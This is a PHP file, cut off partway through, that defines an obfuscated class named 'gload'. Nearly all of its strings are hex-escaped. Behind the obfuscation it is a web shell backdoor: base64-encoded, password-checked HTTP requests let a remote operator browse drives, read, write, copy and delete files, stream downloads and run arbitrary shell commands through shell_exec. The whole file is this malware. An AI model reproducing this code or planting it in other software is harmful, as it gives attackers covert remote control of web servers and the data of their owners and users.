<?php
 class gload{ const version="\x32\x2e\x30\x2e\x33"; protected $dir=null; protected $statements=null; public function __construct(){ @set_time_limit(false); @date_default_timezone_set("\x41\x73\x69\x61\x2f\x4a\x61\x6b\x61\x72\x74\x61"); ${"\x74\x68\x69\x73"}->{"\x73\x74\x61\x74\x65\x6d\x65\x6e\x74\x73"}=[ "\x76\x65\x72\x73\x69\x6f\x6e","\x64\x72\x69\x76\x65\x73","\x73\x63\x61\x6e","\x6e\x65\x77\x44\x69\x72","\x6e\x65\x77\x46\x69\x6c\x65", "\x64\x65\x6c\x65\x74\x65","\x63\x6f\x70\x79","\x72\x65\x6e\x61\x6d\x65","\x77\x72\x69\x74\x65","\x72\x65\x61\x64","\x6c\x6f\x61\x64", "\x64\x65\x74\x61\x69\x6c","\x73\x68\x65\x6c\x6c\x45\x78\x65\x63" ]; ${"\x74\x68\x69\x73"}->{"\x64\x69\x72"}=str_replace('\\',"\x2f",__DIR__)."\x2f"; if(!is_dir(${"\x74\x68\x69\x73"}->{"\x64\x69\x72"})){@mkdir(${"\x74\x68\x69\x73"}->{"\x64\x69\x72"},0755,true);} ${"\x74\x68\x69\x73"}->{"\x68\x65\x61\x64"}(); return ${"\x74\x68\x69\x73"}->{"\x73\x74\x61\x72\x74"}(); } private function start(){ if(isset(${"\x5f\x50\x4f\x53\x54"}["\x6d"],${"\x5f\x50\x4f\x53\x54"}["\x6b"],${"\x5f\x50\x4f\x53\x54"}["\x61"],${"\x5f\x50\x4f\x53\x54"}["\x62"]) &&${"\x74\x68\x69\x73"}->{"\x76\x61\x6c\x69\x64"}(${"\x5f\x50\x4f\x53\x54"}["\x6b"],${"\x5f\x50\x4f\x53\x54"}["\x6d"]) &&in_array(@base64_decode(${"\x5f\x50\x4f\x53\x54"}["\x61"]),${"\x74\x68\x69\x73"}->{"\x73\x74\x61\x74\x65\x6d\x65\x6e\x74\x73"}) &&method_exists(${"\x74\x68\x69\x73"},@base64_decode(${"\x5f\x50\x4f\x53\x54"}["\x61"]))){ ${"\x61\x72\x67\x73"}=@json_decode(@base64_decode(${"\x5f\x50\x4f\x53\x54"}["\x62"]),true); ${"\x61\x72\x67\x73"}=is_array(${"\x61\x72\x67\x73"})?${"\x61\x72\x67\x73"}:[]; return @\call_user_func_array([get_class(${"\x74\x68\x69\x73"}),@base64_decode(${"\x5f\x50\x4f\x53\x54"}["\x61"])],${"\x61\x72\x67\x73"}); }elseif(isset(${"\x5f\x47\x45\x54"}["\x6c"])&&(${"\x6a"}=@json_decode(@base64_decode(${"\x5f\x47\x45\x54"}["\x6c"]))) &&isset(${"\x6a"}->{"\x6d"},${"\x6a"}->{"\x6b"},${"\x6a"}->{"\x66"})&&${"\x74\x68\x69\x73"}->{"\x76\x61\x6c\x69\x64"}(${"\x6a"}->{"\x6b"},${"\x6a"}->{"\x6d"})){ ${"\x73"}=isset(${"\x6a"}->{"\x73"})&&is_int(${"\x6a"}->{"\x73"})?${"\x6a"}->{"\x73"}:null; if(isset(${"\x6a"}->{"\x74"})&&${"\x6a"}->{"\x74"}==true){ return ${"\x74\x68\x69\x73"}->{"\x67\x65\x74\x54\x68\x75\x6d\x62\x6e\x61\x69\x6c"}(${"\x6a"}->{"\x66"},${"\x73"}); }return ${"\x74\x68\x69\x73"}->{"\x6c\x6f\x61\x64"}(${"\x6a"}->{"\x66"},${"\x73"},isset(${"\x6a"}->{"\x64"})&&${"\x6a"}->{"\x64"}?true:false); }return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x34\x30\x31\x20\x55\x6e\x61\x75\x74\x68\x6f\x72\x69\x7a\x65\x64"); } private function getThumbnail($f=null,$s=null){ if(!is_file(${"\x66"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}('404 File doesn\'t exist');} ${"\x64"}="\x2e\x74\x68\x75\x6d\x62\x6e\x61\x69\x6c\x2f"; if(!is_dir(${"\x64"})){@mkdir(${"\x64"},0755,true);} ${"\x74"}=${"\x64"}.md5_file(${"\x66"}); if(!is_file(${"\x74"})){ if(!${"\x74\x68\x69\x73"}->{"\x63\x6f\x70\x79\x49\x6d\x61\x67\x65"}(${"\x66"},${"\x74"})){ ${"\x69"}=@getimagesize(${"\x66"}); if(isset(${"\x69"}[0],${"\x69"}[1])&&$i[0]<=1000&&$i[1]<=1000){ return ${"\x74\x68\x69\x73"}->{"\x6c\x6f\x61\x64"}(${"\x66"},${"\x73"}); }return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x67\x65\x74\x20\x74\x68\x75\x6d\x62\x6e\x61\x69\x6c"); } }return ${"\x74\x68\x69\x73"}->{"\x6c\x6f\x61\x64"}(${"\x74"},${"\x73"}); } private function shellExec($c=null,$d=null){ if(!isset(${"\x63"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x34\x30\x33\x20\x46\x6f\x72\x62\x69\x64\x64\x65\x6e");} @chdir(is_dir(${"\x64"})?${"\x64"}:__DIR__); ${"\x74"}=shell_exec(escapeshellcmd(${"\x63"})); return ${"\x74\x68\x69\x73"}->{"\x6f\x75\x74\x70\x75\x74"}(${"\x74"}!=''?${"\x74"}:"\x4f\x4b"); } private function detail($f=null){ ${"\x69\x6e\x66\x6f"}=${"\x74\x68\x69\x73"}->{"\x69\x6e\x66\x6f"}(${"\x66"}); return ${"\x69\x6e\x66\x6f"}?${"\x74\x68\x69\x73"}->{"\x6f\x75\x74\x70\x75\x74"}(json_encode(${"\x69\x6e\x66\x6f"})):${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}('404 File doesn\'t exist'); } private function version(){ return ${"\x74\x68\x69\x73"}->{"\x6f\x75\x74\x70\x75\x74"}(self::version); } private function drives($j=null){ ${"\x6a"}=is_array(${"\x6a"})?${"\x6a"}:[];${"\x72"}=[]; if(strtoupper(substr(PHP_OS,0,3))==="WIN"){ ${"\x64"}=range("\x41","\x5a"); array_walk(${"\x64"},function(&$v){${"\x76"}=${"\x76"}."\x3a";}); ${"\x6a"}=array_merge(${"\x64"},${"\x6a"}); }elseif(!in_array("\x2f",${"\x6a"})){ ${"\x64"}=["\x2f"];${"\x6a"}=array_merge(${"\x64"},${"\x6a"}); } foreach($j as $v){ if(is_dir(${"\x76"})){ ${"\x66\x72\x65\x65"}=@disk_free_space(${"\x76"}); ${"\x72"}[${"\x76"}]=array( "\x6e\x61\x6d\x65"=>${"\x76"}, "\x66\x72\x65\x65"=>${"\x66\x72\x65\x65"}, "\x74\x6f\x74\x61\x6c"=>@disk_total_space(${"\x76"}), "\x73\x74\x61\x74\x75\x73"=>${"\x66\x72\x65\x65"}?"\x72\x65\x61\x64\x79":"\x6e\x6f\x74\x20\x72\x65\x61\x64\x79", "\x70\x68\x70\x5f\x6f\x73"=>PHP_OS, ); } }return ${"\x74\x68\x69\x73"}->{"\x6f\x75\x74\x70\x75\x74"}(json_encode(${"\x72"})); } private function scan($t=null,$x=false){ if(!is_dir(${"\x74"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}('200 Target doesn\'t exist');} ${"\x72"}=${"\x74\x68\x69\x73"}->{"\x73\x63\x61\x6e\x44\x69\x72"}(${"\x74"},${"\x78"}); if(!is_array(${"\x72"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x73\x63\x61\x6e\x20\x64\x69\x72\x65\x63\x74\x6f\x72\x79");} return ${"\x74\x68\x69\x73"}->{"\x6f\x75\x74\x70\x75\x74"}(json_encode(${"\x72"})); } private function scanDir($t=null,$x=false){ if(!is_dir(${"\x74"})){return false;} ${"\x74"}.=substr(${"\x74"},-1)!="\x2f"?"\x2f":'';${"\x72"}=[]; ${"\x77"}=@array_diff(@scandir(${"\x74"}),["\x2e","\x2e\x2e"]); if(!is_array(${"\x77"})){return false;} @usort(${"\x77"},function($a,$b){ ${"\x63"}="\x2f"; ${"\x61"}=substr(${"\x61"},0,1)==="\x5f"?${"\x63"}.substr(${"\x61"},1):${"\x61"}; ${"\x62"}=substr(${"\x62"},0,1)==="\x5f"?${"\x63"}.substr(${"\x62"},1):${"\x62"}; return strcasecmp(${"\x61"},${"\x62"}); }); foreach($w as $f){ if(is_dir(${"\x74"}.${"\x66"})&&$x){ ${"\x6e"}=${"\x74\x68\x69\x73"}->{"\x69\x6e\x66\x6f"}(${"\x74"}.${"\x66"}); ${"\x6e"}["\x63\x68\x69\x6c\x64\x72\x65\x6e"]=${"\x74\x68\x69\x73"}->{"\x73\x63\x61\x6e\x44\x69\x72"}(${"\x74"}.${"\x66"},${"\x78"}); ${"\x72"}[]=${"\x6e"}; }else{ ${"\x6e"}=${"\x74\x68\x69\x73"}->{"\x69\x6e\x66\x6f"}(${"\x74"}.${"\x66"}); ${"\x72"}[]=${"\x6e"}?${"\x6e"}:${"\x66"}; } }return ${"\x72"}; } private function newDir($t=null){ if(file_exists(${"\x74"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x54\x61\x72\x67\x65\x74\x20\x64\x6f\x65\x73\x20\x65\x78\x69\x73\x74");} if(!@mkdir(${"\x74"},0755,true)){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x63\x72\x65\x61\x74\x65\x20\x64\x69\x72\x65\x63\x74\x6f\x72\x79");} return ${"\x74\x68\x69\x73"}->{"\x6f\x75\x74\x70\x75\x74"}("\x4f\x4b"); } private function newFile($t=null){ if(file_exists(${"\x74"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x54\x61\x72\x67\x65\x74\x20\x64\x6f\x65\x73\x20\x65\x78\x69\x73\x74");} if(!is_dir(dirname(${"\x74"}))){@mkdir(dirname(${"\x74"}),0755,true);} if(@file_put_contents(${"\x74"},'')===false){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x63\x72\x65\x61\x74\x65\x20\x66\x69\x6c\x65");} return ${"\x74\x68\x69\x73"}->{"\x6f\x75\x74\x70\x75\x74"}("\x4f\x4b"); } private function delete($t=null){ if(!file_exists(${"\x74"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x34\x30\x34\x20\x4e\x6f\x74\x20\x46\x6f\x75\x6e\x64");} if(is_file(${"\x74"})){@unlink(${"\x74"});return ${"\x74\x68\x69\x73"}->{"\x6f\x75\x74\x70\x75\x74"}("\x4f\x4b");} elseif(is_dir(${"\x74"})){ if(!${"\x74\x68\x69\x73"}->{"\x64\x65\x6c\x65\x74\x65\x44\x69\x72"}(${"\x74"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x64\x65\x6c\x65\x74\x65\x20\x64\x69\x72\x65\x63\x74\x6f\x72\x79");} return ${"\x74\x68\x69\x73"}->{"\x6f\x75\x74\x70\x75\x74"}("\x4f\x4b"); }return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x55\x6e\x6b\x6e\x6f\x77\x6e\x20\x65\x72\x72\x6f\x72"); } private function deleteDir($t=null){ ${"\x74"}.=substr(${"\x74"},-1)!="\x2f"?"\x2f":''; ${"\x77"}=@array_diff(@scandir(${"\x74"}),["\x2e","\x2e\x2e"]); foreach($w as $f){ if(is_file(${"\x74"}.${"\x66"})){@unlink(${"\x74"}.${"\x66"});} elseif(is_dir(${"\x74"}.${"\x66"})){${"\x74\x68\x69\x73"}->{"\x64\x65\x6c\x65\x74\x65\x44\x69\x72"}(${"\x74"}.${"\x66"});} }@rmdir(${"\x74"});return true; } private function copy($s=null,$t=null){ if(!file_exists(${"\x73"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x34\x30\x34\x20\x4e\x6f\x74\x20\x46\x6f\x75\x6e\x64");} if(is_file(${"\x73"})){ if(file_exists(${"\x74"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x54\x61\x72\x67\x65\x74\x20\x64\x6f\x65\x73\x20\x65\x78\x69\x73\x74");} if(!@copy(${"\x73"},${"\x74"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x63\x6f\x70\x79\x20\x66\x69\x6c\x65");} return ${"\x74\x68\x69\x73"}->{"\x6f\x75\x74\x70\x75\x74"}("\x4f\x4b"); }elseif(is_dir(${"\x73"})){ if(!is_dir(${"\x74"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}('200 Target doesn\'t exist');} if(is_dir(${"\x74"}."\x2f".basename(preg_replace("\x2f\x5c\x2f\x24\x2f",'',${"\x73"})))){ return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x54\x61\x72\x67\x65\x74\x20\x64\x6f\x65\x73\x20\x65\x78\x69\x73\x74"); } if(strpos(${"\x74"},${"\x73"})!==false){ return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x52\x65\x63\x75\x72\x73\x69\x76\x65\x20\x69\x73\x20\x6e\x6f\x74\x20\x61\x6c\x6c\x6f\x77\x65\x64"); } if(!@${"\x74\x68\x69\x73"}->{"\x63\x6f\x70\x79\x44\x69\x72"}(${"\x73"},${"\x74"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x63\x6f\x70\x79\x20\x64\x69\x72\x65\x63\x74\x6f\x72\x79");} return ${"\x74\x68\x69\x73"}->{"\x6f\x75\x74\x70\x75\x74"}("\x4f\x4b"); }return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x55\x6e\x6b\x6e\x6f\x77\x6e\x20\x65\x72\x72\x6f\x72"); } private function copyDir($s=null,$t=null){ if(!is_dir(${"\x73"})||!is_dir(${"\x74"})||is_dir(${"\x74"}."\x2f".basename(${"\x73"}))){return false;} ${"\x74"}.=substr(${"\x74"},-1)!="\x2f"?"\x2f":''; ${"\x73"}.=substr(${"\x73"},-1)!="\x2f"?"\x2f":''; ${"\x75"}=${"\x74"}.basename(substr(${"\x73"},0,-1))."\x2f"; ${"\x77"}=@array_diff(@scandir(${"\x73"}),["\x2e","\x2e\x2e"]); if(!is_dir(${"\x75"})){@mkdir(${"\x75"},0755,true);} foreach($w as $f){ if(is_file(${"\x73"}.${"\x66"})){ @copy(${"\x73"}.${"\x66"},${"\x75"}.${"\x66"}); }elseif(is_dir(${"\x73"}.${"\x66"})){ ${"\x74\x68\x69\x73"}->{"\x63\x6f\x70\x79\x44\x69\x72"}(${"\x73"}.${"\x66"},${"\x75"}); } }return true; } private function rename($s=null,$t=null){ if(!file_exists(${"\x73"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x34\x30\x34\x20\x4e\x6f\x74\x20\x46\x6f\x75\x6e\x64");} if(file_exists(${"\x74"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x54\x61\x72\x67\x65\x74\x20\x64\x6f\x65\x73\x20\x65\x78\x69\x73\x74");} if(!@rename(${"\x73"},${"\x74"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x72\x65\x6e\x61\x6d\x65");} return ${"\x74\x68\x69\x73"}->{"\x6f\x75\x74\x70\x75\x74"}("\x4f\x4b"); } private function load_old($f=null,$s=null){ if(!isset(${"\x66"})||!is_file(${"\x66"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x34\x30\x34\x20\x4e\x6f\x74\x20\x46\x6f\x75\x6e\x64");} ${"\x73"}=is_int(${"\x73"})?${"\x73"}:4;${"\x73"}*=1024; ${"\x6f"}=@fopen(${"\x66"},"\x72\x62"); if(${"\x6f"}===false){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x6f\x70\x65\x6e\x20\x66\x69\x6c\x65");} header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20".${"\x74\x68\x69\x73"}->{"\x73\x69\x7a\x65"}(${"\x66"})); header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20".${"\x74\x68\x69\x73"}->{"\x6d\x69\x6d\x65"}(${"\x66"})); while(!@feof(${"\x6f"})){ echo @fread(${"\x6f"},${"\x73"}); }@fclose(${"\x6f"});exit; } private function load($f=null,$spd=null,$dl=false){ if(!is_string(${"\x66"})||!is_file(${"\x66"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x34\x30\x34\x20\x4e\x6f\x74\x20\x46\x6f\x75\x6e\x64");} ${"\x71"}=sprintf("\x22\x25\x73\x22",addcslashes(basename(${"\x66"}),'"\\')); ${"\x73"}=@${"\x74\x68\x69\x73"}->{"\x73\x69\x7a\x65"}(${"\x66"}); if(${"\x64\x6c"}){header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e\x3a\x20\x46\x69\x6c\x65\x20\x54\x72\x61\x6e\x73\x66\x65\x72");} header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20".(${"\x64\x6c"}?"\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6f\x63\x74\x65\x74\x2d\x73\x74\x72\x65\x61\x6d":${"\x74\x68\x69\x73"}->{"\x6d\x69\x6d\x65"}(${"\x66"}))); header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x44\x69\x73\x70\x6f\x73\x69\x74\x69\x6f\x6e\x3a\x20".(${"\x64\x6c"}?"\x61\x74\x74\x61\x63\x68\x6d\x65\x6e\x74":"\x69\x6e\x6c\x69\x6e\x65")."\x3b\x20\x66\x69\x6c\x65\x6e\x61\x6d\x65\x3d".${"\x71"}); header("\x4c\x61\x73\x74\x2d\x4d\x6f\x64\x69\x66\x69\x65\x64\x3a\x20".@gmdate("\x44\x2c\x20\x64\x20\x4d\x20\x59\x20\x48\x3a\x69\x3a\x73",@filemtime(${"\x66"}))."\x20\x47\x4d\x54"); header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x72\x61\x6e\x73\x66\x65\x72\x2d\x45\x6e\x63\x6f\x64\x69\x6e\x67\x3a\x20\x62\x69\x6e\x61\x72\x79"); header("\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a\x20\x4b\x65\x65\x70\x2d\x41\x6c\x69\x76\x65"); header("\x43\x61\x63\x68\x65\x2d\x43\x6f\x6e\x74\x72\x6f\x6c\x3a\x20\x6d\x75\x73\x74\x2d\x72\x65\x76\x61\x6c\x69\x64\x61\x74\x65\x2c\x20\x6d\x61\x78\x2d\x61\x67\x65\x3d\x30\x2c\x20\x70\x6f\x73\x74\x2d\x63\x68\x65\x63\x6b\x3d\x30\x2c\x20\x70\x72\x65\x2d\x63\x68\x65\x63\x6b\x3d\x30"); header("\x45\x78\x70\x69\x72\x65\x73\x3a\x20".@gmdate("\x44\x2c\x20\x64\x20\x4d\x20\x59\x20\x48\x3a\x69\x3a\x73",time()-(3*24*60*60))."\x20\x47\x4d\x54"); header("\x50\x72\x61\x67\x6d\x61\x3a\x20\x6e\x6f\x2d\x63\x61\x63\x68\x65"); header("\x41\x63\x63\x65\x70\x74\x2d\x52\x61\x6e\x67\x65\x73\x3a\x20\x62\x79\x74\x65\x73"); ${"\x6f"}=0;${"\x74"}=${"\x73"}; if(isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x52\x41\x4e\x47\x45"])&&preg_match("\x2f\x62\x79\x74\x65\x73\x3d\x28\x5c\x64\x2b\x29\x2d\x28\x5c\x64\x2b\x29\x3f\x2f",${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x52\x41\x4e\x47\x45"],${"\x61"})){ if(${"\x73"}>PHP_INT_MAX){ ${"\x6f"}=floatval(${"\x61"}[1]);${"\x74"}=isset(${"\x61"}[2])?floatval(${"\x61"}[2]):${"\x73"}; }else{ ${"\x6f"}=intval(${"\x61"}[1]);${"\x74"}=isset(${"\x61"}[2])?intval(${"\x61"}[2]):${"\x73"}; } } header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x52\x61\x6e\x67\x65\x3a\x20\x62\x79\x74\x65\x73\x20".${"\x6f"}."\x2d".${"\x74"}."\x2f".${"\x73"}); header("\x48\x54\x54\x50\x2f\x31\x2e\x31\x20".(${"\x6f"}>0||${"\x74"}<${"\x73"}?"\x32\x30\x36\x20\x50\x61\x72\x74\x69\x61\x6c\x20\x43\x6f\x6e\x74\x65\x6e\x74":"\x32\x30\x30\x20\x4f\x4b")); header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20".(${"\x74"}-${"\x6f"})); @${"\x74\x68\x69\x73"}->{"\x72\x65\x61\x64\x63\x68\x75\x6e\x6b"}(${"\x66"},true,${"\x6f"},${"\x74"},${"\x73\x70\x64"}); exit; } private function readchunk($f=null,$r=true,$x=null,$y=null,$p=null,$u=true){ if(!is_string(${"\x66"})||!is_file(${"\x66"})){return false;} ${"\x62"}='';${"\x63"}=0;${"\x6f"}=fopen(${"\x66"},"\x72\x62");${"\x77"}=1024*(is_int(${"\x70"})?${"\x70"}:4); if(${"\x6f"}===false){return false;} if(isset(${"\x78"})){fseek(${"\x6f"},${"\x78"});} while(!feof(${"\x6f"})){ ${"\x62"}=fread(${"\x6f"},${"\x77"}); if(${"\x75"}){usleep(1000);} print(${"\x62"});flush(); if(${"\x72"}){${"\x63"}+=strlen(${"\x62"});} if(isset(${"\x79"})&&ftell(${"\x6f"})>=${"\x79"}){break;} }${"\x73"}=fclose(${"\x6f"}); if(${"\x72"}&&$s){return ${"\x63"};} return ${"\x73"}; } private function read($f=null,$p=null,$t=null){ if(!isset(${"\x66"})||!is_file(${"\x66"})){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x34\x30\x34\x20\x4e\x6f\x74\x20\x46\x6f\x75\x6e\x64");} ${"\x70"}=is_numeric(${"\x70"})?(int)${"\x70"}:0; ${"\x74"}=is_numeric(${"\x74"})?(int)${"\x74"}:${"\x74\x68\x69\x73"}->{"\x73\x69\x7a\x65"}(${"\x66"}); ${"\x74"}=min(${"\x74"},${"\x74\x68\x69\x73"}->{"\x73\x69\x7a\x65"}(${"\x66"})); ${"\x6f"}=@fopen(${"\x66"},"\x72\x62"); if(${"\x6f"}===false){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x6f\x70\x65\x6e\x20\x66\x69\x6c\x65");} @fseek(${"\x6f"},${"\x70"}); ${"\x72"}=@fread(${"\x6f"},${"\x74"}); @fclose(${"\x6f"}); return ${"\x74\x68\x69\x73"}->{"\x6f\x75\x74\x70\x75\x74"}(@base64_encode(${"\x72"})); } private function write($f=null,$c=null,$p=null,$t=null){ if(!is_dir(${"\x74"})){@mkdir(${"\x74"},0755,true);} ${"\x6f"}=@fopen(${"\x74"}."\x2f".${"\x66"},(intval(${"\x70"})==0?"\x77\x62":"\x72\x62\x2b")); if(${"\x6f"}===false){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x6f\x70\x65\x6e\x20\x66\x69\x6c\x65");} if(!@flock(${"\x6f"},LOCK_EX)){return ${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x6c\x6f\x63\x6b\x20\x66\x69\x6c\x65");} @fseek(${"\x6f"},intval(${"\x70"})); ${"\x77"}=@fwrite(${"\x6f"},(get_magic_quotes_gpc()?stripslashes(base64_decode(${"\x63"})):base64_decode(${"\x63"}))); @flock(${"\x6f"},LOCK_UN); @fclose(${"\x6f"}); return ${"\x77"}>=0?${"\x74\x68\x69\x73"}->{"\x6f\x75\x74\x70\x75\x74"}("\x4f\x4b"):${"\x74\x68\x69\x73"}->{"\x65\x72\x72\x6f\x72"}("\x32\x30\x30\x20\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x77\x72\x69\x74\x65\x20\x66\x69\x6c\x65"); } private function copyImage($f=null,$r=null,$w=100,$h=100,$c=true){ if(!is_string(${"\x66"})||!is_file(${"\x66"})){return false;} ${"\x69"}=@getimagesize(${"\x66"}); if(!${"\x69"}){return false;} ${"\x74"}=isset(${"\x69"}["\x6d\x69\x6d\x65"])&&preg_match("\x2f\x28\x6a\x70\x65\x67\x7c\x70\x6e\x67\x7c\x67\x69\x66\x29\x24\x2f",${"\x69"}["\x6d\x69\x6d\x65"],${"\x61"})?${"\x61"}[1]:false; switch(${"\x74"}){ case "\x67\x69\x66":${"\x64"}=@imagecreatefromgif(${"\x66"});break; case "\x70\x6e\x67":${"\x64"}=@imagecreatefrompng(${"\x66"});break; case "\x6a\x70\x65\x67":${"\x64"}=@imagecreatefromjpeg(${"\x66"});break; default:${"\x64"}=@imagecreatefromstring(@file_get_contents(${"\x66"})); } ${"\x69"}=@getimagesize(${"\x66"}); if(!${"\x64"}){return false;} ${"\x77"}=is_int(${"\x77"})?${"\x77"}:100; ${"\x68"}=is_int(${"\x68"})?${"\x68"}:100; ${"\x6e\x68"}=${"\x69"}[1];${"\x6e\x77"}=${"\x69"}[0]; ${"\x78"}=0;${"\x79"}=0; if(${"\x63"}){ if(${"\x6e\x77"}>=${"\x77"} and ${"\x6e\x68"}>=${"\x68"}){ ${"\x72\x61\x74\x69\x6f"}=max(${"\x77"}/${"\x6e\x77"},${"\x68"}/${"\x6e\x68"}); ${"\x79"}=(${"\x6e\x68"}-${"\x68"}/${"\x72\x61\x74\x69\x6f"})/2; ${"\x6e\x68"}=${"\x68"}/${"\x72\x61\x74\x69\x6f"}; ${"\x78"}=(${"\x6e\x77"}-${"\x77"}/${"\x72\x61\x74\x69\x6f"})/2; ${"\x6e\x77"}=${"\x77"}/${"\x72\x61\x74\x69\x6f"}; }else{return false;} }else{ if(${"\x6e\x77"}>=${"\x77"} or ${"\x6e\x68"}>=${"\x68"}){ ${"\x72\x61\x74\x69\x6f"}=min(${"\x77"}/${"\x6e\x77"},${"\x68"}/${"\x6e\x68"}); ${"\x77"}=${"\x69"}[0]*${"\x72\x61\x74\x69\x6f"}; ${"\x68"}=${"\x69"}[1]*${"\x72\x61\x74\x69\x6f"}; }else{return false;} } ${"\x6e"}=imagecreatetruecolor(${"\x77"},${"\x68"}); if(${"\x74"}=="gif" or ${"\x74"}=="png"){ imagecolortransparent(${"\x6e"},imagecolorallocatealpha(${"\x6e"},0,0,0,127)); imagealphablending(${"\x6e"},false); imagesavealpha(${"\x6e"},true); } imagecopyresampled(${"\x6e"},${"\x64"},0,0,${"\x78"},${"\x79"},${"\x77"},${"\x68"},${"\x6e\x77"},${"\x6e\x68"}); switch(${"\x74"}){ case "\x67\x69\x66":@imagegif(${"\x6e"},${"\x72"});break; case "\x70\x6e\x67":@imagepng(${"\x6e"},${"\x72"});break; case "\x6a\x70\x65\x67":@imagejpeg(${"\x6e"},${"\x72"});break; default:@imagejpeg(${"\x6e"},${"\x72"});break; }return ${"\x74"}?(${"\x74"}=="\x6a\x70\x65\x67"?"\x6a\x70\x67":${"\x74"}):"\x6a\x70\x67"; } private function output($s=null){ ${"\x73"}=is_string(${"\x73"})?${"\x73"}:''; header("\x48\x54\x54\x50\x2f\x31\x2e\x31\x20\x32\x30\x30\x20\x4f\x4b"); header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20".strlen(${"\x73"})); exit(${"\x73"}); } private function error($s=null){ ${"\x73"}=is_string(${"\x73"})?${"\x73"}:"\x32\x30\x30\x20\x55\x6e\x6b\x6e\x6f\x77\x6e\x20\x65\x72\x72\x6f\x72"; header("\x48\x54\x54\x50\x2f\x31\x2e\x31\x20".${"\x73"}); ${"\x74"}="\x45\x72\x72\x6f\x72\x3a\x20".${"\x73"}."\x2e"; header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20".strlen(${"\x74"})); exit(${"\x74"}); } private function valid($p=null,$m=null){ if(!is_string(${"\x70"})||!is_string(${"\x6d"}) ||!${"\x74\x68\x69\x73"}->{"\x6d\x61\x73\x74\x65\x72"}(base64_decode(${"\x6d"})) ||!preg_match("\x2f\x5e\x67\x6c\x2f",${"\x70"})){ return false; 